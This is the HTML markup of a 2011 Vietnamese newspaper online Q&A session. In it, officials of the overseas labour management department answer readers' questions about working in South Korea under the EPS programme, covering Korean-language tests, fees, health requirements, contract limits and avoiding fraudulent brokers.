+<P class=pQuestion>* Trong kỳ thi kiểm tra tiếng Hàn, nếu em đạt từ 80 điểm trở lên thì sẽ có&nbsp;thông báo trên mạng, hay em phải đủ điểm đỗ đối với ngành đăng ký thì mới có thông báo điểm? Em nghe một chị đã dự thi nói: chị ấy làm bài khá tốt nhưng chắc khoảng 120-140 điểm thôi, ngành điện tử mà chị ấy đăng ký là 160 điểm nên khi có thông báo điểm, chị ấy nhập SBD và họ tên mà không thấy? (Lưu Văn Quỳnh, 22 tuổi, VQuynh92@)</P>
+<P class=pAnswer><STRONG>- Ông Lê Mạnh Hùng: </STRONG>Theo quy định của Cơ quan phát triển nguồn nhân lực Hàn Quốc (HRD Korea) thì chỉ những người có điểm đạt yêu cầu mới được thông báo trên mạng. Người đạt yêu cầu sẽ được xét theo từng ngành dự tuyển. </P>
+<P class=pAnswer>Số lượng người đạt yêu cầu trong từng ngành bằng số chỉ tiêu phân bổ cho ngành đó được lựa chọn theo nguyên tắc lấy từ người có điểm từ cao xuống thấp, trong số những người đạt từ 80 điểm trở lên đăng ký dự tuyển trong ngành tương ứng.</P>
+<DIV id=50376>
+<P class=pQuestion>* Cho tôi hỏi địa điểm làm việc, công việc làm là gì? Mức lương tối thiểu là bao nhiêu? Chi phí để có thể sang Hàn Quốc là bao nhiêu? (Phạm Thị Thu Liễu, 26 tuổi, haynghidentuonglai@...)</P></DIV>
+<DIV id=50392>
+<DIV id=50393>
+<P class=pAnswer><STRONG>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=2 cellPadding=0 width=40 align=center>
+<TBODY>
+<TR>
+<TD><IMG class=lImage onclick="return showImage(this.src)" border=1 hspace=0 src="ImageView.aspx?ThumbnailID=530815" Hyperlink></TD></TR>
+<TR>
+<TD class=tLegend>Ông Nguyễn Như Tuấn (bên phải), phó trưởng phòng thị trường lao động Cục Quản lý lao động ngoài nước, trả lời độc giả Tuổi Trẻ Online - Ảnh: Nguyễn Khánh </TD></TR></TBODY></TABLE></STRONG></P>
+<P class=pAnswer><STRONG>- Ông Nguyễn Như Tuấn:</STRONG> Công việc làm tại Hàn Quốc tùy thuộc vào ngành nghề bạn đăng ký (sản xuất chế tạo, xây dựng, nông nghiệp hay thủy sản) và địa điểm làm việc sẽ tùy thuộc vào người sử dụng lao động lựa chọn ký hợp đồng với bạn. </P>
+<P class=pAnswer>Hiện nay người lao động của Việt Nam làm việc nhiều tại các vùng như: Seoul, Busan, Teachon. Chi phí để đi làm việc tại Hàn Quốc theo hệ thống cấp phép cho lao động nước ngoài của Hàn Quốc (chương trình EPS) là 630 USD. </P>
+<P class=pAnswer>Ngoài ra, khi xuất cảnh bạn phải mang theo 500 USD để mua bảo hiểm hồi hương và bảo hiểm rủi ro theo quy định của phía Hàn Quốc. </P>
+<P class=pAnswer>Tuy nhiên, một trong những điều kiện cần thiết để đi làm việc tại Hàn Quốc là bạn phải vượt qua kỳ kiểm tra tiếng Hàn như tôi&nbsp;đã nói&nbsp;ở trên. Chi phí&nbsp;để tham&nbsp;dự kỳ kiểm tra này là 24&nbsp;USD. &nbsp;</P></DIV>
+<DIV id=50404>
+<P class=pQuestion>* Với trình độ&nbsp;ĐH thì liệu khi xuất khẩu mình có thể có công việc tốt không? Và mức thu nhập cho lao động có trình độ&nbsp;ĐH như thế nào? (Phạm Duy Phương, 19 tuổi, jmmyphuong92@)</P>
+<P class=pAnswer><STRONG>- Ông Nguyễn Như Tuấn</STRONG>: Chào bạn Phương, nếu bạn có trình độ&nbsp;đại học, có kinh nghiệm làm việc, có ngoại ngữ (tiếng Hàn hoặc&nbsp;tiếng Anh) bạn có thể tìm hiểu cơ hội sang làm việc tại Hàn Quốc theo chương trình thẻ vàng như tôi đã nói ở trên. Còn đối với chương trình làm việc tại Hàn Quốc, theo hệ thống cấp phép cho lao động nước ngoài làm việc tại Hàn Quốc (chương trình EPS) thì không có phân biệt gì về mức lương theo trình độ của người lao động. </P>
+<DIV id=50423>
+<P class=pQuestion>* Em đã thi kiểm tra tiếng Hàn năm 2010, nhưng giờ em muốn thi lại. Em không biết thủ tục thi lại như thế nào?&nbsp;Và passport đang bị giữ ngoài Hà Nội, nếu bây giờ em thi thì cách làm thủ tục hồ sơ như thế nào? (phan fren, 22 tuổi, phanfren@).</P></DIV>
+<DIV id=50396>
+<DIV id=50383>
+<P class=pAnswer><STRONG>- Ông Phan Văn Minh:</STRONG>&nbsp;Bạn đã có hồ sơ đăng ký dự tuyển đi làm việc tại Hàn Quốc, và theo quy định phía Hàn Quốc, người lao động không thể đồng thời có hai hồ sơ dự tuyển trên mạng (nếu có hai hồ sơ thì sẽ bị hủy cả hai hồ sơ). Vì vậy, bạn không thể đăng ký tham dự kiểm tra tiếng Hàn trong kỳ thi tiếng Hàn ngày 17, 18-12-2011.</P>
+<P class=pAnswer></P></DIV>
+<DIV id=50429>
+<P class=pQuestion>*&nbsp;Năm nay em&nbsp;23 tuổi,&nbsp;vừa tốt nghiệp ngành&nbsp;quản trị kinh doanh. Em bị cận thị 2 độ, vậy em đăng ký xuất khẩu lao động Hàn Quốc có được không? (Nguyễn Thành Thịnh, 23 tuổi, thanhthinh_092003@)</P>
+<P class=pAnswer><STRONG>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=2 cellPadding=0 width=40 align=center>
+<TBODY>
+<TR>
+<TD><IMG class=lImage onclick="return showImage(this.src)" border=1 hspace=0 src="ImageView.aspx?ThumbnailID=530816" Hyperlink></TD></TR>
+<TR>
+<TD>
+<P class=tLegend>Ông Nguyễn Thanh Tùng (bìa trái), phó trưởng phòng quản lý lao động và ông Lê Mạnh Hùng (bìa phải), trưởng phòng tuyển chọn lao động, trả lời trực tuyến - Ảnh: Nguyễn Khánh </P></TD></TR></TBODY></TABLE></STRONG></P>
+<P class=pAnswer><STRONG>- Ông Lê Mạnh Hùng:</STRONG> Theo quy định của Bộ Y tế,&nbsp;tiêu chuẩn về thị lực đối với người lao động thì người lao động phải có thị lực từ 8/10 trở lên (kể cả có đeo kính hoặc không đeo kính). Vì vậy nếu&nbsp;bạn cận thị 2 độ (2điốp), đeo kính mà vẫn có thị lực đạt từ 8/10 trở lên, không bị mù màu hay rối loạn sắc giác&nbsp;thì đạt yêu cầu.</P>
+<P class=pQuestion>* Tôi đang điều trị bệnh basedow (cường giáp), xin hỏi tôi có thể đi xuất khẩu lao động tại Hàn được không? Tôi có thể kiểm tra sức khỏe để đi xuất khẩu lao động tại nơi nào? (thủy, 26 tuổi, conangdangyeu200585@).</P>
+<P class=pAnswer><STRONG>- Ông Phan Văn Minh:</STRONG> Một trong những điều kiện để được đăng ký dự tuyển đi lao động tại Hàn Quốc là người lao động phải đủ sức khỏe theo quy định tại Thông tư Liên tịch số 10/2004-BYT- LĐTBXH - BTC ngày 16-12-2004. Bạn có thể kiểm tra sức khỏe tại&nbsp;bệnh viện&nbsp;đa khoa cấp tỉnh&nbsp;được Bộ Y tế cấp phép về việc kiểm tra sức khỏe&nbsp;cho người&nbsp;lao&nbsp;động&nbsp;đi làm việc&nbsp;ở nước&nbsp;ngoài.&nbsp;</P>
+<P class=pQuestion>* Khi thi đậu và hồ sơ được chủ sử dụng Hàn Quốc lựa chọn thì người lao động phải nộp khoản phí theo quy định là 630 USD. Khi xuất cảnh sang Hàn Quốc, người lao động sẽ đóng thêm 500 USD để mua bảo hiểm rủi ro, bảo hiểm hồi hương, gần 700.000 đồng mua đồng phục và tham gia quỹ hỗ trợ việc làm ngoài nước. Ngoài các phí trên mình có còn đóng thêm phí nào khác nữa không? Xin cám ơn ạ! (Trần Ngân, 22 tuổi, thefallingstar_vl@...)</P></DIV>
+<DIV id=50468>
+<P class=pAnswer><STRONG>- Ông Nguyễn Như Tuấn:</STRONG> Chào bạn Ngân, sau khi bạn thi đạt tiếng Hàn và được chủ sử dụng Hàn Quốc lựa chọn các mức kinh phí mà bạn nói trên cơ bản là&nbsp;đúng. Nhưng lưu&nbsp;ý&nbsp;có mức tiền Việt&nbsp;thực tế theo quy định chỉ gồm 280.000 đồng tiền trang phục mùa hè (còn mùa đông&nbsp;là 300.000 đồng) + 100.000 tiền đóng góp quỹ hỗ trợ việc làm ngoài nước. Như vậy bạn cần phải nộp các khoản phí là 630 USD cộng với gần 400.000 đồng tại VN, còn 500 USD là mang sang Hàn Quốc để mua bảo hiểm rủi ro, bảo hiểm hồi hương. Ngoài ra không phải nộp bất kỳ khoản nào khác.</P>
+<P class=pAnswer>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width="95%" align=center>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center>
+<P class=pQuestion><FONT color=#686868><FONT color=#fafafa><FONT color=#030303><FONT color=#000000>* Tôi muốn đi XKLĐ Hàn Quốc, nhưng đọc báo thấy có nhiều trường hợp bị lừa. Xin hỏi làm thế nào để tránh bị lừa? Đơn vị nào uy tín để tôi liên hệ? (Duy Minh, 26 tuổi)</FONT></P>
+<P class=pAnswer>- <STRONG>Ông Đào Công Hải</STRONG>: Đầu tiên bạn phải xác định bạn sẽ đi theo chương trình nào. Vì như tôi đã nói ở trên, hiện có ba chương trình để bạn có thể tham khảo, chọn lựa: chương trình EPS, chương trình "thẻ vàng" và chương trình ngư nghiệp.</P>
+<P class=pAnswer>Nếu bạn đi theo chương trình EPS thì đầu tiên phải biết tiếng Hàn để có thể vượt qua kỳ thi tuyển tiếng Hàn. Cơ quan duy nhất của VN thực hiện chương trình này là Bộ LĐTB-XH và bộ đã ủy quyền cho Trung tâm Lao động ngoài nước. </P>
+<P class=pAnswer>Nếu bạn đi theo chương trình "thẻ vàng" thì cần phải có tay nghề chuyên môn cao, có kinh nghiệm từ ba năm cho các lĩnh vực như CNTT, điện, điện cơ...</P>
+<P class=pAnswer>Và nếu đi theo chương trình ngư nghiệp thì bạn cần có sức khỏe, am hiểu về nghề biển.</P>
+<P class=pAnswer>Cuối cùng, dù bạn muốn đi theo chương trình gì thì cũng nên liên hệ trực tiếp với Sở LĐTB-XH nơi bạn cư trú để được tư vấn, giúp đỡ. </P>
+<P class=pAnswer>Hoặc bạn gọi điện thoại trực tiếp đến đường dây nóng: 04-3734.6093 hoặc 04-3824.9517 (máy lẻ 312, 511, 601) để biết thông tin. </P>
+<P class=pAnswer><STRONG>Để tránh bị lừa, tuyệt đối bạn không nên thông qua các môi giới bất hợp pháp, mà nên liên hệ trực tiếp với Sở LĐTB-XH nơi bạn cư trú.</STRONG></P></FONT></FONT></FONT></TD></TR></TBODY></TABLE></P>
+<DIV id=50468>* Nếu được tuyển đi&nbsp;lao&nbsp;động&nbsp;Hàn Quốc, em có được vay vốn không? Nếu được thì thủ tục vay như thế nào? (dang van yen, 22 tuổi, mryen90@).</DIV>
+<DIV id=50402>
+<P class=pAnswer><STRONG>- Ông Phan Văn Minh:</STRONG> Nếu bạn có nhu cầu vay vốn để đi làm việc ở nước ngoài thì bạn liên hệ với ngân hàng chính sách xã hội tại địa phương để được hướng dẫn và làm các thủ tục cần thiết.</P>
+<P class=pQuestion>* Em năm nay 20 tuổi, quê Bến Tre, là bộ đội mới xuất ngũ, em muốn đi hợp tác lao động ở Hàn Quốc nhưng không biết thủ tục đăng ký như thế nào, chi phí bao nhiêu, có phải thế chấp gì hay không? (Huynh Minh Khoa, 20 tuổi, huynhkimsa83@...)</P>
+<DIV id=50519>
+<P class=pAnswer>- <STRONG>Bà Phạm Thị Việt Hoa</STRONG> (phó trưởng phòng thông tin tuyên truyền Cục QLLĐNN): Bạn&nbsp;sẽ đăng ký như một công dân bình thường. Bạn muốn đi làm việc tại Hàn Quốc thì đầu tiên cần biết tiếng Hàn và phải vượt qua kỳ kiểm tra tiếng Hàn. Đây là một trong những điều kiện cần thiết để đi làm việc tại Hàn Quốc theo chương trình EPS. Ngoài ra bạn còn phải đáp ứng các yêu cầu về sức khỏe theo quy định đối với lao động VN đi làm việc ở nước ngoài.</P>
+<P class=pAnswer>Nếu bạn có nhu cầu dự kỳ kiểm tra tiếng Hàn đợt tới (tổ chức vào ngày 17 và 18-12-2011) thì&nbsp;bạn&nbsp;đến&nbsp;đăng ký tại Sở LĐTB-XH tỉnh Bến Tre. Thời hạn đăng ký từ ngày 11 đến 14-11-2011. Chi phí cho dự kiểm tra tiếng Hàn là 24 USD theo quy định của phía Hàn Quốc.</P>
+<P class=pAnswer>Chi phí đi làm việc tại Hàn Quốc đối với những người đủ điều kiện là 630 USD và khoảng 400.000 đồng VN. Ngoài ra khi xuất cảnh, bạn phải mang theo 500 USD để tham gia bảo hiểm rủi ro theo quy định của phía Hàn Quốc. Người lao động đi làm việc tại Hàn Quốc không phải thế chấp.</P></DIV>
+<P class=pAnswer></P></DIV>
+<DIV id=50422>
+<P class=pQuestion>* Xin cho hỏi hiện tại và sau này đã có biện pháp nào hiệu quả để ngăn chặn việc lao động bỏ trốn chưa? Và trong những năm tới phía Hàn Quốc và Việt Nam có kế hoạch cho những kỳ thi nữa không? Xin cám ơn (Nguyễn Quốc Bảo, 1984, baoquoc_kg@)</P>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Chương trình EPS của Việt Nam và Hàn Quốc được thực hiện từ 2004 và cứ&nbsp;hai năm hiệp định sẽ được ký lại. Như vậy Việt Nam và Hàn Quốc đã ký lại 3 lần rồi, và kỳ thi tiếng Hàn là điều kiện cần do phía Hàn Quốc tổ chức và Việt Nam là phía phối hợp. </P>
+<P class=pAnswer>Vừa qua số lượng lao động Việt Nam hết hạn hợp đồng ở lại sống, làm việc bất hợp pháp đã làm ảnh hưởng rất nhiều đến chương trình. Cụ thể kỳ thi tiếng Hàn dự kiến tổ chức 8-2011 đã bị phía Hàn Quốc "treo" lại. Trước đây chương trình Tu nghiệp sinh Hàn Quốc là người lao động phải đóng tiền thế chấp, đặt cọc. Việc này tạo ra khó khăn cho người lao động, nhưng chương trình EPS không quy định tiền đặt cọc. </P>
+<P class=pAnswer>Nếu hiện tượng lao động ở lại Hàn Quốc bất hợp pháp vẫn tiếp diễn thì vấn đề "đặt cọc" sẽ lại được xem xét để áp dụng trở lại với chương trình EPS. Nếu lao động về nước đúng thời hạn, nếu có nhu cầu thì sau 6 tháng kể từ khi về nước sẽ được có cơ hội thi tiếng Hàn để quay trở lại Hàn Quốc làm việc. Nếu ở lại bất hợp pháp, phía Hàn Quốc sẽ không cấp visa cho cá nhân này vào Hàn Quốc dưới bất cứ hình thức nào. </P>
+<P class=pAnswer>Trong trường hợp giáo dục, động viên lao động đang cư trú bất hợp pháp về nước mà không về thì phía cảnh sát Hàn Quốc sẽ tổ chức các đợt truy quét để bắt, trục xuất về nước. Và tháng 8-2003, phía Hàn Quốc đã mở đợt truy quét lao động nước ngoài để chuẩn bị cho chương trình EPS.</P></DIV>
+<DIV id=50471>
+<P class=pQuestion>*&nbsp;Em nghe nói ở bên Hàn Quốc đang bị thất nghiệp, lương gần như không đủ chi tiêu chứ đừng nói là gửi về quê nhà. Vấn đề này có phải không ạ? (Vu Ngoc tuan, 27 tuổi, ngoctuan1234@...)</P>
+<P class=pAnswer><STRONG>- Ông Nguyễn Như Tuấn:</STRONG> Thông tin bạn nghe hoàn toàn không chính xác. Hiện phía Hàn Quốc có nhu cầu tiếp nhận nhiều lao động nước ngoài, công việc phù hợp và thu nhập đảm bảo.</P></DIV>
+<DIV id=50459>
+<P class=pQuestion>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width=220 align=right>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>
+<P class=pQuestion>* Em tôi từng đi&nbsp;xuất khẩu lao&nbsp;động&nbsp;Hàn Quốc nhưng sau đó bỏ trốn. Liệu&nbsp;em tôi có cơ hội đi lần nữa không? (Hà, 35 tuổi)</P>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Như tôi đã trả lời, nếu bạn đã trốn khỏi nơi làm việc đang trong thời gian hợp đồng thì bạn sẽ không bao giờ còn cơ hội để quay trở lại Hàn Quốc làm việc, vì tên của bạn đã nằm trong danh sách đen của Bộ Tư pháp Hàn Quốc.</P>
+<P class=pQuestion>* Tôi là lao động làm việc tại Hàn Quốc hợp đồng 3 năm. Hết hợp đồng tôi trốn ra ngoài làm việc thêm 2 năm nữa rồi tự nguyện về nước. Vậy khi nào tôi có thể quay lại làm việc tại Hàn Quốc? (Mai Thị Hoa, 39 tuổi, khiemrot@...)</P>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Khi bạn đã bỏ ra ngoài làm không có sự đồng ý của chủ sử dụng lao động thì bạn đã là lao động bất hợp pháp và nằm trong "danh sách đen" của Bộ Tư pháp Hàn Quốc. Vì thế bạn không còn cơ hội để quay lại làm việc. </P></FONT></FONT></FONT></TD></TR></TBODY></TABLE>* Cho tôi hỏi xuất khẩu lao động đi Hàn Quốc có ngành CNTT không? Tiêu chuẩn sức khỏe đi Hàn Quốc như thế nào? (Huy Thống, 27 tuổi, thongdinhnguyen_skv@)</P></DIV>
+<DIV id=50360>
+<P class=pAnswer><STRONG>- Ông Lê Mạnh Hùng:</STRONG> Việc tuyển chọn lao động đi làm việc tại Hàn Quốc theo chương trình EPS không đòi hỏi người lao động phải có tay nghề hay phải qua đào tạo. Vì vậy tất cả người lao động có nguyện vọng, đáp ứng các quy định chung đều được đăng ký tham dự kỳ kiểm tra tiếng Hàn&nbsp;để&nbsp;dự tuyển đi làm việc tại Hàn Quốc. </P>
+<P class=pAnswer>Người lao động đi làm việc tại Hàn Quốc phải đáp ứng tiêu chuẩn về sức khỏe&nbsp;quy định tại TTLT số 10/2004/TTLT-BYT-BLĐTBXH-BTC. Hội đồng khám và chứng nhận&nbsp;sức khỏe của bệnh viện được phép khám và chứng nhận sức khỏe&nbsp;cho người đi làm việc tại nước ngoài theo quy định tại thông tư nói trên sẽ kết luận người&nbsp;lao&nbsp;động&nbsp;đủ sức khỏe hay không.</P>
+<P class=pAnswer></P></DIV>
+<DIV id=50425>
+<P class=pQuestion>* Tôi rất muốn đi lao động hợp tác ở Hàn Quốc nhưng vì hoàn cảnh gia đình tôi chỉ học đến lớp&nbsp;8. Xin hỏi tôi có được làm hồ sơ dự thi không? (Le Van Huy, 23 tuổi, catphung@)</P></DIV>
+<DIV id=50391>
+<P class=pAnswer><STRONG>- Ông Lê Mạnh Hùng:</STRONG> Việc tuyển chọn lao động đi làm việc tại Hàn Quốc theo chương trình EPS chỉ yêu cầu người lao động vượt qua kỳ kiểm tra tiếng Hàn, không yêu cầu trình độ văn hóa của người lao động. Vì vậy nếu bạn có nguyện vọng,&nbsp;đáp&nbsp;ứng các&nbsp;điều kiện&nbsp;chung theo quy&nbsp;định thì&nbsp;bạn vẫn được đăng ký kiểm tra tiếng Hàn để dự tuyển đi làm việc tại Hàn Quốc. </P>
+<P class=pAnswer>Có những vấn đề nào bạn cần trợ giúp thêm về quy trình dự tuyển&nbsp;đi làm việc tại Hàn Quốc theo chương trình EPS thì liên hệ qua tổng đài điện thoại của TT LĐNN: 043 734 6093 hoặc truy cập trang web <A onclick="return onLinkClick(this)" href="http://www.ttldnnvietnam.gov.vn/" resizable="yes" toolbar="yes" titlebar="yes" scrollbars="yes" menubar="yes" statusbar="yes" location="yes" width="1200" height="800">http://www.ttldnnvietnam.gov.vn/</A>.</P></DIV>
+<DIV id=50401>
+<P class=pQuestion>* Tôi muốn đi lao động Hàn Quốc nhưng không biết đăng ký ở đâu, lương căn bản bao nhiêu, làm thêm lương bao nhiêu, qua Hàn Quốc làm những việc gì? Rất mong nhận được sự tư vấn của quý cơ quan, chân thành cảm ơn (Nguyen Dang, 26 tuổi, nguyen_dangktt@)</P>
+<P class=pAnswer><STRONG>- Ông Nguyễn Như Tuấn:</STRONG> Như tôi đã nói ở trên, bạn muốn đi làm việc tại Hàn Quốc thì một trong những điều kiện cần thiết là bạn phải vượt qua kỳ kiểm tra tiếng Hàn do Bộ Lao động và Việc làm Hàn Quốc phối hợp với Bộ Lao động - Thương binh và xã hội Việt Nam tổ chức. </P>
+<P class=pAnswer>Kỳ kiểm tra tiếng Hàn lần thứ 9 sẽ được tổ chức vào hai ngày 17 và 18-12-2011. Thời hạn đăng ký từ ngày 11 đến 14-11-2011 tại địa điểm do Sở Lao động thương binh và xã hội địa phương nơi bạn cư trú quy định. </P>
+<P class=pAnswer>Về mức lương, công việc và thu nhập bạn có thể tham khảo những thông tin tôi đã trả lời ở trên. </P>
+<DIV id=50385>
+<P class=pQuestion>* Tôi năm nay 25 tuổi, tốt nghiệp đại học và có kinh nghiệm 2 năm làm việc cho công ty nước ngoài tại Việt Nam, chuyên ngành phần mềm máy tính. Xin cho hỏi, tôi có thể xuất khẩu lao động sang Hàn Quốc theo hình thức gì, trong thời gian dài nhất là bao lâu, với mức lương khoảng bao nhiêu? Xin cảm ơn!(Huỳnh Ngọc Long, 25 tuổi, boy_overteen@)</P>
+<P class=pAnswer><STRONG>- Ông Nguyễn Như Tuấn:</STRONG> Đối với việc&nbsp;tiếp nhận lao động nước ngoài theo chương trình thẻ vàng của Hàn Quốc, người lao động nước ngoài có trình độ đại học hoặc&nbsp;cao đẳng trong các lĩnh vực công nghệ Nano, công nghệ vật liệu mới, cơ điện tử, công nghệ thông tin, lập trình viên có trình độ tiếng Anh hoặc Hàn tốt, có từ 3 năm kinh nghiệm công tác trở lên có thể trở thành ứng viên tham gia chương trình. </P>
+<P class=pAnswer>Như vậy đối với chương trình này bạn còn thiếu một năm kinh nghiệm theo quy định của phía Hàn Quốc. Trường hợp của bạn nếu bạn muốn đi làm việc tại Hàn Quốc, bạn có thể cân nhắc chương trình EPS. Thông tin về chương trình này bạn có thể tham khảo ở những câu trả lời trước của tôi.</P></DIV>
+<DIV id=50413>
+<P class=pQuestion>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width=200 align=left>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>
+<DIV id=50369>
+<P class=pQuestion>* Nếu đơn vị môi giới không đảm bảo các điều kiện về việc làm, mức lương, chế độ nghỉ ngơi... như hợp đồng đã ký với người lao động thì phải chịu trách nhiệm thế nào? (Nguyen Ngoc Thanh, 38 tuổi, nguyenngoc10@)</P>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Bạn đi làm việc tại Hàn Quốc là bạn được ký hợp đồng với chủ sử dụng lao động Hàn Quốc về mức lương, thời gian làm việc, thời gian nghỉ ngơi, ngày lễ, thời gian làm thêm cũng như các chính sách bảo hiểm khác được nêu rất cụ thể trong hợp đồng. </P>
+<P class=pAnswer>Trong trường hợp xảy ra những thắc mắc liên quan đến điều kiện hợp đồng (như bạn nêu) thì bạn có thể liên lạc tới Ban quản lý lao động VN tại HQ, Đại sứ quán VN tại Hàn Quốc, hoặc Cơ quan Phát triển nguồn nhân lực Hàn Quốc (HRD) để được giúp đỡ. </P>
+<P class=pAnswer>Trước khi bạn xuất cảnh thì các địa chỉ trên đã được cung cấp đến bạn, nên khi ở HQ nếu xảy ra việc gì bạn có thể liên lạc đến các địa chỉ đó để được giúp đỡ.</P></DIV>
+<DIV id=50436>
+<P class=pQuestion>* Người lao động đi Hàn Quốc làm việc,&nbsp;nếu được chủ đánh giá cao và gia hạn hợp đồng thì được gia hạn mấy lần? Liệu có thể xin ở lại Hàn Quốc luôn được không? (H.Luận, 28 tuổi)</P>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Chương trình EPS chỉ có thời hạn hợp đồng tối đa là 4 năm 10 tháng. </P>
+<P class=pAnswer>Vì thế dù bạn được ông chủ sử dụng lao động đánh giá cao thì khi hết hạn hợp đồng bạn vẫn phải về nước. Sau khi về nước đủ 6 tháng thì bạn lại đăng ký để thi tuyển tiếng Hàn để có cơ hội được trở lại Hàn Quốc.</P></DIV></FONT></FONT></FONT></TD></TR></TBODY></TABLE>* Em đã thi đậu kỳ thi ngày&nbsp;17-10-2010. Đến giờ em lên trang web của Trung tâm Lao động ngoài nước thấy trạng thái hồ sơ vẫn chưa&nbsp;được chuyển. Cho em hỏi cách chuyển hồ sơ là sao? Bao giờ hồ sơ của&nbsp;em được chuyển?(Nguyenthiloan, 25 tuổi, Locnguyenthi@)</P>
+<P class=pAnswer><STRONG>- Ông Lê Mạnh Hùng:</STRONG> Hồ sơ đăng ký dự tuyển của người&nbsp;lao&nbsp;động&nbsp;được chuyển về TT LĐNN để kiểm tra. Tất các các hồ sơ&nbsp;đủ&nbsp;điều kiện&nbsp;được gửi&nbsp;sang giới thiệu&nbsp;cho chủ sử dụng lao động Hàn Quốc lựa chọn. Những hồ sơ không đủ điều kiện được thông báo bằng văn bản cho sở LĐTBXH và đăng công khai trên website của TT LĐNN.</P>
+<P class=pAnswer>Tất cả mọi người lao động tham dự kiểm tra tiếng Hàn trong năm 2010 có hồ sơ đạt yêu cầu đã được gửi sang Hàn Quốc. Trong trường hợp bạn không có tên trong phần&nbsp;danh sách tình trạng hồ sơ thì hồ sơ của bạn không&nbsp;nằm trong danh sách&nbsp;không đủ điều kiện.</P>
+<DIV id=50431>
+<P class=pQuestion>* Tôi muốn hỏi là hiện tại có thông tin rằng sau đợt thi tuyển vào tháng 11 này thì phía Hàn Quốc sẽ ngưng cho thi tiếng Hàn trong ba năm tới có phải không? (Trần Văn Trung, 30 tuổi, kientrung_vnn@)</P>
+<P class=pAnswer><STRONG>- Ông Lê Mạnh Hùng:</STRONG> Hiện nay Bộ LĐTBXH mới có kế hoạch tổ chức kiểm tra tiếng Hàn vào ngày 17 và 18-12-2011 chứ chưa có kế hoạch kiểm tra tiếng Hàn của những năm tiếp theo. Vì vậy thông tin mà bạn nhận được là không chính xác.</P>
+<P class=pAnswer></P></DIV>
+<DIV id=50375>
+<P class=pQuestion>* 1/ Tại sao lại có hiện tượng bỏ, trốn việc này? 2/ Số lao động bỏ, trốn việc này hiện đang làm việc cho ai? 3/ Tại sao chỉ đổ lỗi cho người lao động mà lại không đề cập đến những ông chủ đang sử dụng số lao động này? (DƯƠNG PHÚC CẢNH, 38 tuổi, duongcanh1973@)</P>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Việt Nam và Hàn Quốc hợp tác về lao động từ 1993. Đến 2004 thì Việt Nam đã đưa hàng ngàn tu nghiệp sinh sang Hàn Quốc, và từ đó đến nay Chính phủ Hàn Quốc thực hiện Luật cấp phép cho người lao động&nbsp;nước ngoài (EPF). Việt Nam là một trong 15 nước được Hàn Quốc chọn tham gia chương trình này. Việt Nam cũng là nước phái cử có số lượng lao động đông nhất. </P>
+<P class=pAnswer>Đến nay đã có 65.000 lao động Việt Nam đi làm theo chương trình này&nbsp;tại Hàn Quốc. Thời gian làm việc theo hợp đồng, phía Hàn Quốc đã nâng từ 3 năm tới 5 hoặc 6 năm làm việc. Lao động Việt Nam trước khi đi phải cam kết về nước khi hết hạn hợp đồng. </P>
+<P class=pAnswer>Song hiện tượng lao động Việt Nam hết hạn hợp đồng nhưng ở lại sống, làm việc bất hợp pháp đã ảnh hưởng đến chương trình này . Nguyên nhân chủ yếu là muốn ở lại làm thêm, tăng thu nhập.</P>
+<P class=pAnswer>Chính phủ Hàn Quốc đã có những quy định xử phạt hành chính để ngăn chặn hiện tượng trên. Nếu ông chủ sử dụng một lao động nước ngoài bất hợp pháp sẽ bị phạt 20.000 USD và một lao động ở lại bất hợp pháp sẽ bị xử phạt 40.000 USD. Ngoài ra phía Việt Nam cũng có quy định xử phạt hành chính đối với lao động&nbsp;Việt ở lại Hàn Quốc bất hợp pháp.</P>
+<P class=pAnswer></P></DIV>
+<DIV id=50398>
+<P class=pQuestion>* Tôi có một người cậu thi vào tháng 10-2010 tại Vinh,&nbsp;đăng ký ngành xây dựng. Hồ sơ đã nộp ở Sở LĐ Hà Tĩnh, đến bây giờ chưa thấy tin gì. Tôi muốn biết hồ sơ hiện tại đang ở đâu, có đi được không, làm thế nào để biết nước bạn nhận hồ sơ? (Đặng Ngọc Anh, 38 tuổi, dang kel2007@).</P></DIV>
+<DIV id=50434>
+<P class=pAnswer><STRONG>- Ông Phan Văn Minh:</STRONG> Hồ sơ đăng ký dự tuyển đi làm việc tại Hàn Quốc của bạn nếu đã được Sở LĐTB&amp;XH tỉnh Hà Tĩnh gửi về Trung tâm Lao động Ngoài nước thì Trung tâm Lao động Ngoài nước đã kiểm tra, nếu hồ sơ hợp lệ thì đã được nhập dữ liệu vào máy tính và gửi qua mạng Internet sang Hàn Quốc để phía Hàn Quốc giới thiệu cho chủ sử dụng Hàn Quốc. </P>
+<P class=pAnswer>Trong trường hợp hồ sơ của bạn chưa hoàn thiện hoặc hồ sơ không&nbsp;hợp lệ thì Trung tâm Lao&nbsp;động Ngoài nước có công văn gửi&nbsp;Sở LĐTB&amp;XH Hà Tĩnh&nbsp;để thông báo cho bạn biết và hoàn thiện hồ sơ. Nếu&nbsp;đến nay bạn không nhận&nbsp;được thông báo&nbsp;đó thì hồ sơ của bạn&nbsp;đã&nbsp;được Trung tâm Lao&nbsp;động Ngoài nước gửi sang Hàn Quốc và&nbsp;đang trong thời gian chờ&nbsp;để phía Hàn Quốc giới thiệu cho chủ sử dụng Hàn Quốc&nbsp;lựa chọn.&nbsp;</P>
+<P class=pAnswer></P></DIV>
+<DIV id=50369>
